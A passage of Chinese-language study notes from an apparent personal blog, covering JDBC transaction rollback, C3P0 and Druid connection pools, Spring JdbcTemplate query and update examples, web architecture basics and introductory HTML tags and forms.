conn.prepareStatement(sql1);</span><br><span class="line">    <span class="comment">//手动制造异常</span></span><br><span class="line">    <span class="type">int</span> i=<span class="number">3</span>/<span class="number">0</span>;</span><br><span class="line">    pstmt2= conn.prepareStatement(sql2);</span><br><span class="line">    <span class="comment">//设置参数</span></span><br><span class="line">    pstmt1.setDouble(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">    pstmt1.setInt(<span class="number">2</span>,<span class="number">4</span>);</span><br><span class="line">    pstmt2.setDouble(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">    pstmt2.setInt(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    pstmt1.executeUpdate();</span><br><span class="line">    pstmt2.executeUpdate();</span><br><span class="line">    <span class="comment">//提交事务</span></span><br><span class="line">    conn.commit();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="comment">//事务回滚</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;</span><br><span class="line">            conn.rollback();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">        ex.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    JdbcUtil.close(pstmt1,conn);</span><br><span class="line">    JdbcUtil.close(pstmt2,<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>可以防止代码因bug中断没有完成所有sql的执行</p></blockquote><h2 id="数据库连接池"><a href="#数据库连接池" class="headerlink" title="数据库连接池"></a>数据库连接池</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>其实就是一个容器（集合），存放数据库连接的容器。当系统初始化好后，容器被创建，容器中会申请一些连接对象，当用户来访问数据库时，从容器中获取连接对象，用户访问完之后，会将连接对象归还给容器</p><blockquote><p>好处</p><ul><li>节约资源</li><li>用户访问高效</li></ul></blockquote><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>标准接口：DataSource javax.sql包下</p><ul><li>方法：<ul><li>获取连接:getConnection()</li><li>归还连接：如果连接对象Connection是从连接池中获取，调用Connention.close()方法是归还连接</li></ul></li></ul><p>一般不实现，由数据库厂商实现</p><ul><li>C3P0:数据库连接池技术</li><li>Druid：数据库连接池技术，阿里巴巴提供</li></ul><h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><h4 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h4><ul><li>导入jar包 两个  mchange-commons-java-0.2.12.jar c3p0-0.9.5.2.jar 以及数据库驱动jar包</li><li>定义配置文件<ul><li>名称：c3p0.properties 或者 c3p0-config.xml</li><li>路径：直接放在src目录下</li></ul></li><li>创建核心对象 数据库连接池对象 ComboPooledDataSource</li><li>获取连接 getConnection</li></ul><h3 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h3><h4 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h4><ul><li>导入jar包 druid-1.0.9.jar 以及数据库驱动jar包</li><li>定义配置文件<ul><li>properties形式</li><li>可以叫任意名称，可以放任意目录</li></ul></li><li>获取数据库连接池对象： 通过工厂类获取 DruidDataSourceFactory</li><li>获取连接</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载配置文件</span></span><br><span class="line"><span class="type">Properties</span> <span class="variable">pro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> DruidDemo.class.getClassLoader().getResourceAsStream(<span class="string">&quot;druid.properties&quot;</span>);</span><br><span class="line">pro.load(is);</span><br><span class="line"><span class="comment">//获取连接池对象</span></span><br><span class="line">DataSource ds= DruidDataSourceFactory.createDataSource(pro);</span><br><span class="line"><span class="comment">//获取连接</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ds.getConnection();</span><br><span class="line">System.out.println(conn);</span><br></pre></td></tr></table></figure></div><h4 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h4><ul><li>定义一个工具类JdbcUtils</li><li>提供静态代码块加载配置文件，初始化连接池对象</li><li>提供方法<ul><li>获取连接方法：通过数据库连接池获取连接</li><li>释放资源丰富</li><li>获取连接池的方法</li></ul></li></ul><h2 id="Spring-JDBC"><a href="#Spring-JDBC" class="headerlink" title="Spring JDBC"></a>Spring JDBC</h2><p>Spring框架对JDBC的简单封装，提供了一个JDBCTemplate对象简化对JDBC的开发</p><h3 id="使用步骤-1"><a href="#使用步骤-1" class="headerlink" title="使用步骤"></a>使用步骤</h3><ul><li><p>导入jar包，5个</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4cladmloaj20vi07k3z3.jpg"                      alt="image-20220719220914974"                ><figcaption>image-20220719220914974</figcaption></figure></p></li><li><p>创建JdbcTemplate对象，依赖于数据源DataSource</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JdbcTemplate tmp=<span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(ds)  <span class="comment">//ds是DataSource对象</span></span><br></pre></td></tr></table></figure></div></li><li><p>调用JdbcTemplate的方法来完成CRUD的操作</p><ul><li><p>update() 执行DML 增删改</p></li><li><p>queryForMap() 查询结果将结果封装成map集合</p><ul><li><p>结果集封装成map集合，列名作为key，值作为value</p></li><li><p>结果集长度只能是1</p></li></ul></li><li><p>queryForList() 查询结果将结果封装成list集合</p><ul><li>将每一条记录封装成Map，在装载到List集合中</li></ul></li><li><p>query() 查询结果，将结果封装为JavaBean对象</p><ul><li>参数 RowMapper<ul><li>一般使用BeanPropertyRowMapper实现类，可以完成数据到JavaBean的自动封装</li><li>new BeanPropertyRowMapper&lt;类型&gt;(类型.class)</li></ul></li></ul></li><li><p>queryForObject:查询结果，将结果封装成对象</p><ul><li>一般用于聚合函数的查询</li></ul></li></ul></li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导入jar包</span></span><br><span class="line"><span class="comment">//创建JDBCTemplate对象</span></span><br><span class="line">JdbcTemplate template=<span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(JdbcUtils.getDataSource());</span><br><span class="line"><span class="comment">//调用方法</span></span><br><span class="line">String sql=<span class="string">&quot;update mystudy set value= 3361 where id=?&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> template.update(sql, <span class="number">3</span>);<span class="comment">//有几个问号sql后面就跟几个参数，不用写下标</span></span><br><span class="line">System.out.println(count);</span><br></pre></td></tr></table></figure></div><h3 id="执行DML语句"><a href="#执行DML语句" class="headerlink" title="执行DML语句"></a>执行DML语句</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取JdbcTemplate对象</span></span><br><span class="line"><span class="keyword">private</span> JdbcTemplate template=<span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(JdbcUtils.getDataSource());</span><br><span class="line"><span class="comment">//练习</span></span><br><span class="line"><span class="comment">//Junit单元测试，独立执行</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;update mystudy set value=1000 where id =?&quot;</span>;</span><br><span class="line">    <span class="comment">//执行sql</span></span><br><span class="line">    <span class="type">int</span> count=template.update(sql,<span class="number">3</span>);</span><br><span class="line">    System.out.println(count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加一条记录</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;insert into mystudy values(6,?,?)&quot;</span>;</span><br><span class="line">    <span class="type">int</span> count=template.update(sql,<span class="string">&quot;小雨奕奕&quot;</span>,<span class="number">3599</span>);</span><br><span class="line">    System.out.println(count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除记录</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;delete from mystudy where id =?&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> template.update(sql, <span class="number">6</span>);</span><br><span class="line">    System.out.println(count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="执行DQL语句"><a href="#执行DQL语句" class="headerlink" title="执行DQL语句"></a>执行DQL语句</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询id为1的记录，封装为Map集合</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;select * from mystudy where id=? &quot;</span>;</span><br><span class="line">    Map&lt;String, Object&gt; map = template.queryForMap(sql, <span class="number">1</span>);<span class="comment">//结果集长度只能是1</span></span><br><span class="line">    System.out.println(map);<span class="comment">//&#123;id=1, name=宇甜, value=339.0&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询所有记录，封装成List</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test5</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;select * from mystudy&quot;</span>;</span><br><span class="line">    List&lt;Map&lt;String, Object&gt;&gt; list = template.queryForList(sql);</span><br><span class="line">    <span class="keyword">for</span> (Map&lt;String,Object&gt; s:list) &#123;</span><br><span class="line">        System.out.println(s);<span class="comment">//打印所有</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询所有记录，封装成Emp对象的List集合</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="comment">//自己实现接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test6</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;select * from mystudy&quot;</span>;</span><br><span class="line">    List&lt;Emp&gt; list = template.query(sql, <span class="keyword">new</span> <span class="title class_">RowMapper</span>&lt;Emp&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Emp <span class="title function_">mapRow</span><span class="params">(ResultSet rs, <span class="type">int</span> i)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="type">Emp</span> <span class="variable">emp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Emp</span>();</span><br><span class="line">            <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> rs.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="type">double</span> <span class="variable">value</span> <span class="operator">=</span> rs.getDouble(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">            emp.setId(id);</span><br><span class="line">            emp.setValue(value);</span><br><span class="line">            emp.setName(name);</span><br><span class="line">            <span class="keyword">return</span> emp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">for</span> (Emp emp : list) &#123;</span><br><span class="line">        System.out.println(emp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="comment">//使用默认接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test6_2</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;select * from mystudy&quot;</span>;</span><br><span class="line">    List&lt;Emp&gt; list = template.query(sql, <span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;Emp&gt;(Emp.class));</span><br><span class="line">    <span class="keyword">for</span> (Emp emp : list) &#123;</span><br><span class="line">        System.out.println(emp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询总记录数</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test7</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;select count(id) from mystudy&quot;</span>;</span><br><span class="line">    Long total=template.queryForObject(sql,Long.class);</span><br><span class="line">    System.out.println(total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h2><h3 id="C-x2F-S-Client-x2F-Server"><a href="#C-x2F-S-Client-x2F-Server" class="headerlink" title="C&#x2F;S:Client&#x2F;Server"></a>C&#x2F;S:Client&#x2F;Server</h3><ul><li><p>本地员工客户端，远程一个服务端</p></li><li><p>e.g. qq、迅雷</p></li><li><p>优点：</p><ul><li>用户体验高</li></ul></li><li><p>缺点</p><ul><li>安装、部署、维护、开发麻烦</li></ul></li></ul><h3 id="B-x2F-S：Browser-x2F-Server-（JavaWeb开发）"><a href="#B-x2F-S：Browser-x2F-Server-（JavaWeb开发）" class="headerlink" title="B&#x2F;S：Browser&#x2F;Server （JavaWeb开发）"></a>B&#x2F;S：Browser&#x2F;Server （JavaWeb开发）</h3><ul><li><p>只需要一个浏览器,用户通过标题的网址，客户访问不同的服务器端程序</p></li><li><p>优点：开发 安装 维护 部署 简单</p></li><li><p>缺点</p><ul><li>绕过应用过大，影响用户体验</li><li>对硬件要求过高</li></ul></li></ul><h2 id="资源分类"><a href="#资源分类" class="headerlink" title="资源分类"></a>资源分类</h2><h3 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h3><ul><li>使用静态网页技术发布的资源</li><li>特点<ul><li>所有用户访问，结果一样</li><li>文本、图片、音频、HTML、CSS、JS<ul><li>HTML:语言展示页面</li><li>CSS:用于美化，布局</li><li>JS:控制页面元素，让页面有动态效果</li></ul></li><li>绕过用户请求静态资源，服务器会直接发送给浏览器，浏览器内置解析引擎，可以展示静态资源</li></ul></li></ul><h3 id="动态资源"><a href="#动态资源" class="headerlink" title="动态资源"></a>动态资源</h3><ul><li>使用动态网页时发布的资源</li><li>特点<ul><li>用户访问得到结果可能不一样</li><li>jsp&#x2F;servlet 、php、asp…</li><li>如果用户请求动态资源，服务器会执行动态资源，转换成静态资源，发给浏览器</li></ul></li></ul><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><h3 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h3><p>用超链接方式，将不同空间的文字信息组织在一起的网状文本</p><h3 id="标记语言"><a href="#标记语言" class="headerlink" title="标记语言"></a>标记语言</h3><ul><li>标签构成，&lt;标签名称&gt; html xml</li><li>标记语言表示编程语言</li></ul><h2 id="快速入门-1"><a href="#快速入门-1" class="headerlink" title="快速入门"></a>快速入门</h2><h3 id="后缀名"><a href="#后缀名" class="headerlink" title="后缀名"></a>后缀名</h3><p>.html或.htm</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>标签分类</p><ul><li>围堵标签 有开始和结束标签 <code>&lt;title&gt;&lt;/title&gt;</code></li><li>自闭合标签 开始标签和结束标签在一起 <code>&lt;br/&gt;</code></li></ul><p>在开始标签中可以定义属性，属性由键值对构成，值需要引号(单双都可)引起来 <code>&lt;font color=&#39;red&#39;&gt; Hello &lt;/font&gt;</code></p><blockquote><p>html标签不屈服大小写标签，建议使用小写</p></blockquote><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&#x27;red&#x27;</span>&gt;</span> Hello <span class="tag">&lt;/<span class="name">font</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&#x27;green&#x27;</span>&gt;</span> Hello <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="文件标签"><a href="#文件标签" class="headerlink" title="文件标签"></a>文件标签</h2><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><p>根标签</p><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>头标签，指定html文档的属性，引入外部资源</p><h3 id="title"><a href="#title" class="headerlink" title="title"></a>title</h3><p>标题标签</p><h3 id="body"><a href="#body" class="headerlink" title="body"></a>body</h3><p>体标签</p><h3 id="lt-DOCTYPE-gt"><a href="#lt-DOCTYPE-gt" class="headerlink" title="&lt;!DOCTYPE &gt;"></a><code>&lt;!DOCTYPE &gt;</code></h3><p>声明文档类型</p><h2 id="文本标签"><a href="#文本标签" class="headerlink" title="文本标签"></a>文本标签</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--注释--&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h3><p>h1-h6 递减 <code>&lt;h1&gt;&lt;/h1&gt;</code></p><h3 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h3><p><code>&lt;p&gt;&lt;/p&gt;</code></p><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><p><code>&lt;br&gt;</code></p><h3 id="展示水平线"><a href="#展示水平线" class="headerlink" title="展示水平线"></a>展示水平线</h3><p><code>&lt;hr&gt;</code></p><p>属性</p><ul><li>color</li><li>width 宽度</li><li>size 高度</li><li>align 对齐方式<ul><li>center</li><li>left</li><li>right</li></ul></li></ul><h3 id="字体加粗-斜体"><a href="#字体加粗-斜体" class="headerlink" title="字体加粗 斜体"></a>字体加粗 斜体</h3><p><code>&lt;b&gt;&lt;/b&gt;</code> <code>&lt;i&gt;&lt;/i&gt;</code></p><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;#ff7f50&quot;</span> <span class="attr">size</span>=<span class="string">&quot;200&quot;</span> <span class="attr">face</span>=<span class="string">&quot;楷体&quot;</span>&gt;</span>野猪野猪<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>属性</p><ul><li>color :英文单词&#x2F;rgb(值1，值2，值3) 值 0-255–&gt;#后跟三个值的16进制</li><li>width 单位为像素 也可以赋值 <code>数值%</code>:占比相对于父元素的比例</li><li>size 大小</li><li>face字体</li></ul><h4 id="文本居中"><a href="#文本居中" class="headerlink" title="文本居中"></a>文本居中</h4><p><code>&lt;center&gt;&lt;/center&gt;</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4drfr8zv0j216e0u0q8e.jpg"                      alt="image-20220720222734009"                ><figcaption>image-20220720222734009</figcaption></figure></p><h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><h3 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h3><p>img</p><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><ul><li>src 指定路径</li></ul><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../image/1.jpg&quot;</span><span class="attr">align</span>=<span class="string">&quot;right&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;海岸&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><ul><li>alt 加载失败时显示的文字</li></ul><h3 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h3><p>有序列表</p><ul><li>ol 包裹整个大列表</li><li>li 包裹每一行</li><li>type 每行标识符样式 start 开始标识符</li></ul><p>无序列表</p><ul><li>ul 包裹整个大列表</li><li>li 包裹每一行</li><li>type 每行标识符样式</li></ul><h3 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h3><p><code>&lt;a href=&quot;url&quot;&gt;&lt;/a&gt;</code></p><p>属性</p><ul><li>href ：放url(统一资源定位符)也可以放文件路径以及其他协议的http</li><li>target:<ul><li>_self 默认值 在当前页面打开</li><li>_blank 在新页面打开</li></ul></li></ul><blockquote><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">超链接功能</span><br><span class="line"><span class="number">1</span>、可以被点击：样式</span><br><span class="line"><span class="number">2</span>、跳转到href指定到url</span><br><span class="line">需求：保留<span class="number">1</span>，去掉<span class="number">2</span></span><br><span class="line">实现：href=<span class="string">&quot;javascript:void(0);&quot;</span></span><br><span class="line"><span class="comment">//如果只href=&quot;&quot; 默认点击后跳转当前页面，相对于刷新</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="块标签"><a href="#块标签" class="headerlink" title="块标签"></a>块标签</h3><p>span：文本在一行展示，行内标签，内联标签 结合css使用</p><p>div 每一个标签占一行 块级标签 结合css使用</p><h3 id="语义化标签"><a href="#语义化标签" class="headerlink" title="语义化标签"></a>语义化标签</h3><p>header</p><p>footer</p><p>为了提高程序可读性使用，与css一起使用</p><h3 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h3><p>table 定义表格</p><ul><li>width 宽度</li><li>border 边框</li><li>cellspacing 定义单元格之间的距离，如果指定为0，则单元格线会合为一条</li><li>cellpadding 定义内容与单元格之间的距离</li><li>bgcolor 背景色</li><li>align 对齐方式</li></ul><p>tr 定义行</p><ul><li>bgcolor 背景色</li><li>align 对齐方式</li></ul><p>td 定义单元格</p><ul><li>bgcolor 背景色</li><li>align 对齐方式</li><li>colspan 合并列</li><li>rowspan 合并行</li></ul><p>th 定义表头单元格</p><p>caption 表格标题</p><p>thead 表示表格头部分</p><p>tbody 表示表格主体</p><p>tfoot 表示表格脚部分</p><h2 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>表单：用于采集用户输入数据，用于和服务器进行交互</p><p>使用标签:form</p><h3 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h3><ul><li>action 指定提交数据的url</li><li>method 指定提交方式<ul><li>一个7种，常用get，post</li><li>get:请求参数会在地址栏中显示，封装在请求行中，请求参数长度有限制,不太安全</li><li>post：请求参数不在地址栏中显示，会封装在请求体中，请求参数长度没限制，比较安全</li></ul></li></ul><blockquote><p>get方式提交完，url上会显示传参，参数名是输入框的name属性</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>url?username&#x3D;13213&amp;password&#x3D;ewe#</p><p>注意：不加name属性，不会被提交,因此必须指定name属性</p></blockquote><h3 id="表单项标签"><a href="#表单项标签" class="headerlink" title="表单项标签"></a>表单项标签</h3><h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><p>通过type属性值，改变展示样式,默认type为text表示文本输入框</p><p>type属性取值</p><ul><li><p>text：文本输入框</p><ul><li>placeholder属性，设置提示内容，淡淡灰色</li></ul></li><li><p>password ：密码输入框</p></li><li><p>radio 单选框,要实现单选效果，name属性要一样 ，选择的话传参数<code>name值=参数值</code></p><ul><li><p>一般加上value属性 表示该选项被选中后传的参数值</p><blockquote><p>如果不加value，只会传on和off，on表示有被选中，off表示都没被选</p></blockquote></li><li><p>checked属性，设置赋值checked或只加check都可以默认选</p></li></ul></li><li><p>checkbox 复选框</p><ul><li>基本和单选框一样</li></ul></li><li><p>file 文件选择框</p></li><li><p>hidden 隐藏域，用于提交一些信息</p></li><li><p>submit 提交表单</p></li><li><p>button 按钮</p><ul><li>可以加图片 src属性</li></ul></li><li><p>image 图片样式的提交按钮</p></li><li><p>color 取色器</p></li><li><p>datetime-local&#x2F;data 